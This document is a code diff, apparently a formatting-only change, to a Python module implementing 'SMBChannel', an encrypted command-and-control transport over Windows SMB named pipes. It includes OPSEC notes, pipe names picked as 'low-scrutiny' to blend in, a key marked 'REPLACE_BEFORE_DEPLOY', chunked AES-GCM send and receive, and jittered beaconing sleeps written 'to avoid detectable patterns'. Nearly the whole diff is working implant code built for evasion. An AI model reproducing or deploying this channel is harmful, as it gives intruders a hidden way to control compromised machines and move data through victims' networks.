@@ -16,6 +16,7 @@ OPSEC constraints:
   - Payload chunking for large data transfers (max 4096 bytes per transaction).
   - Authentication fallback for different SMB versions (2.1, 3.0, 3.1.1).
 """
+
 from __future__ import annotations
 
 import logging
@@ -35,11 +36,11 @@ except ImportError:
 
 # Permitted pipe names (low-scrutiny, legitimate IPC pipes)
 _ALLOWED_PIPES: list[str] = [
-    "atsvc",    # Task Scheduler RPC — preferred
-    "winreg",   # Remote Registry RPC — preferred
-    "lsarpc",   # Local Security Authority
+    "atsvc",  # Task Scheduler RPC — preferred
+    "winreg",  # Remote Registry RPC — preferred
+    "lsarpc",  # Local Security Authority
     "browser",  # Computer Browser (legacy but still seen)
-    "netlogon", # Netlogon service
+    "netlogon",  # Netlogon service
 ]
 
 _BANNED_PIPES: frozenset[str] = frozenset({"svcctl", "ROUTER", "epmapper"})
@@ -47,7 +48,7 @@ _BANNED_PIPES: frozenset[str] = frozenset({"svcctl", "ROUTER", "epmapper"})
 # SMB protocol versions for fallback
 _SMB_VERSIONS: list[str] = ["2.1", "3.0", "3.1.1"]
 _MAX_CHUNK_SIZE = 4096  # Maximum payload chunk size for large transfers
-_MAX_RETRIES = 3       # Maximum retry attempts for connection failures
+_MAX_RETRIES = 3  # Maximum retry attempts for connection failures
 _INITIAL_RETRY_DELAY = 5  # Initial retry delay in seconds
 
 
@@ -77,7 +78,7 @@ def _get_pipe_name(kb_db: Optional[Path] = None) -> str:
 
 def _exponential_backoff(attempt: int, base_delay: float = _INITIAL_RETRY_DELAY) -> float:
     """Calculate exponential backoff delay with jitter."""
-    delay = base_delay * (2 ** attempt)
+    delay = base_delay * (2**attempt)
     jitter = random.uniform(0.5, 1.5)
     return delay * jitter
 
@@ -99,24 +100,24 @@ class SMBChannel:
 
     def __init__(
         self,
-        target:      str,
-        username:    str           = "",
-        password:    str           = "",
-        domain:      str           = "",
-        session_key: str           = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
-        kb_db:       Optional[Path] = None,
-        interval:    int           = 60,
-        jitter_pct:  int           = 20,
-        fallback_timeout: int       = 30,
+        target: str,
+        username: str = "",
+        password: str = "",
+        domain: str = "",
+        session_key: str = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
+        kb_db: Optional[Path] = None,
+        interval: int = 60,
+        jitter_pct: int = 20,
+        fallback_timeout: int = 30,
     ) -> None:
-        self._target      = target
-        self._username    = username
-        self._password    = password
-        self._domain      = domain
-        self._key         = bytes.fromhex(session_key) if len(session_key) == 64 else None
-        self._pipe_name   = _get_pipe_name(kb_db)
-        self._interval    = interval
-        self._jitter_pct  = jitter_pct
+        self._target = target
+        self._username = username
+        self._password = password
+        self._domain = domain
+        self._key = bytes.fromhex(session_key) if len(session_key) == 64 else None
+        self._pipe_name = _get_pipe_name(kb_db)
+        self._interval = interval
+        self._jitter_pct = jitter_pct
         self._fallback_timeout = fallback_timeout
         self._connection_cache: Optional[Tuple[object, object, object]] = None  # (conn, tid, fid)
         _LOG.debug("SMBChannel: pipe=\\\\%s\\pipe\\%s", target, self._pipe_name)
@@ -128,7 +129,7 @@ class SMBChannel:
         """
         if _offline_strict():
             return None
-            
+
         if SMBConnection is None:
             _LOG.warning("impacket not installed; SMBChannel disabled.")
             return None
@@ -138,94 +139,106 @@ class SMBChannel:
             for attempt in range(_MAX_RETRIES):
                 try:
                     conn = SMBConnection(self._target, self._target)
-                    
+
                     # Set SMB dialect if supported
-                    if hasattr(conn, 'setDialect'):
-                        dialect_map = {
-                            "2.1": 0x0210,
-                            "3.0": 0x0300, 
-                            "3.1.1": 0x0311
-                        }
+                    if hasattr(conn, "setDialect"):
+                        dialect_map = {"2.1": 0x0210, "3.0": 0x0300, "3.1.1": 0x0311}
                         if smb_version in dialect_map:
                             conn.setDialect(dialect_map[smb_version])
-                    
+
                     conn.login(self._username, self._password, self._domain)
                     tid = conn.connectTree("IPC$")
                     fid = conn.openFile(
-                        tid, f"\\{self._pipe_name}",
+                        tid,
+                        f"\\{self._pipe_name}",
                         desiredAccess=0x12019F,  # FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE
                         shareMode=0x3,
                         creationOption=0,
                         creationDisposition=0x1,  # OPEN_EXISTING
                         fileAttributes=0x80,  # NORMAL
                     )
-                    _LOG.debug("SMBChannel: connected with %s (attempt %d)", smb_version, attempt + 1)
+                    _LOG.debug(
+                        "SMBChannel: connected with %s (attempt %d)", smb_version, attempt + 1
+                    )
                     return (conn, tid, fid)
-                    
+
                 except Exception as exc:
-                    _LOG.debug("SMB connection attempt %d with %s failed: %s", attempt + 1, smb_version, exc)
+                    _LOG.debug(
+                        "SMB connection attempt %d with %s failed: %s",
+                        attempt + 1,
+                        smb_version,
+                        exc,
+                    )
                     if attempt < _MAX_RETRIES - 1:
                         delay = _exponential_backoff(attempt)
                         _LOG.debug("Retrying in %.1f seconds...", delay)
                         time.sleep(delay)
                     else:
-                        _LOG.warning("SMB connection failed with %s after %d attempts", smb_version, _MAX_RETRIES)
-        
+                        _LOG.warning(
+                            "SMB connection failed with %s after %d attempts",
+                            smb_version,
+                            _MAX_RETRIES,
+                        )
+
         return None
 
     def send(self, data: bytes) -> bool:
         """Send data with chunking support for large payloads."""
         if _offline_strict():
             return False
-            
+
         encrypted = self._encrypt(data)
-        
+
         # Chunk large payloads
-        chunks = [encrypted[i:i + _MAX_CHUNK_SIZE] for i in range(0, len(encrypted), _MAX_CHUNK_SIZE)]
-        
+        chunks = [
+            encrypted[i : i + _MAX_CHUNK_SIZE] for i in range(0, len(encrypted), _MAX_CHUNK_SIZE)
+        ]
+
         # Use cached connection or establish new one
         conn_info = self._connection_cache or self._connect_with_fallback()
         if not conn_info:
             return False
-            
+
         conn, tid, fid = conn_info
         success = True
-        
+
         try:
             for i, chunk in enumerate(chunks):
                 try:
                     conn.writeFile(tid, fid, chunk)
-                    _LOG.debug("SMBChannel: sent chunk %d/%d (%d bytes)", i + 1, len(chunks), len(chunk))
-                    
+                    _LOG.debug(
+                        "SMBChannel: sent chunk %d/%d (%d bytes)", i + 1, len(chunks), len(chunk)
+                    )
+
                     # Small delay between chunks to avoid overwhelming the pipe
                     if i < len(chunks) - 1:
                         time.sleep(0.1)
-                        
+
                 except Exception as exc:
                     _LOG.debug("SMB chunk %d send error: %s", i, exc)
                     success = False
                     break
-                    
+
         finally:
             # Don't close connection immediately - cache it for next operation
             self._connection_cache = conn_info if success else None
-            
+
         return success
 
     def recv(self, timeout: int = 30) -> Optional[bytes]:
         """Receive data with timeout and reassembly support."""
         if _offline_strict():
             return None
-            
+
         # Use cached connection or establish new one
         conn_info = self._connection_cache or self._connect_with_fallback()
         if not conn_info:
             return None
-            
+
         conn, tid, fid = conn_info
         fragments = []
         deadline = time.monotonic() + timeout
-        
+
         try:
             while time.monotonic() < deadline:
                 try:
@@ -234,7 +247,7 @@ class SMBChannel:
                     if data:
                         fragments.append(data)
                         _LOG.debug("SMBChannel: received fragment (%d bytes)", len(data))
-                        
+
                         # Check if more data is immediately available
                         if len(data) == _MAX_CHUNK_SIZE:
                             continue
@@ -242,24 +255,24 @@ class SMBChannel:
                             break
                     else:
                         break
-                        
+
                 except Exception as exc:
                     _LOG.debug("SMB recv error: %s", exc)
                     break
-                    
+
         finally:
             # Cache connection for reuse
             self._connection_cache = conn_info
-            
+
         if not fragments:
             return None
-            
+
         assembled = b"".join(fragments)
         return self._decrypt(assembled) if assembled else None
 
     def sleep(self) -> None:
         """Sleep with gaussian jitter to avoid detectable patterns."""
-        sigma  = self._interval * (self._jitter_pct / 100)
+        sigma = self._interval * (self._jitter_pct / 100)
         actual = max(5.0, random.gauss(self._interval, sigma))
         _LOG.debug("SMBChannel: sleeping for %.1f seconds", actual)
         time.sleep(actual)
@@ -285,7 +298,8 @@ class SMBChannel:
         try:
             from Crypto.Cipher import AES
             from Crypto.Random import get_random_bytes
-            nonce  = get_random_bytes(12)
+
+            nonce = get_random_bytes(12)
             cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
             ct, tag = cipher.encrypt_and_digest(data)
             return nonce + tag + ct
@@ -298,6 +312,7 @@ class SMBChannel:
             return raw
         try:
             from Crypto.Cipher import AES
+
             nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
             cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
             return cipher.decrypt_and_verify(ct, tag)
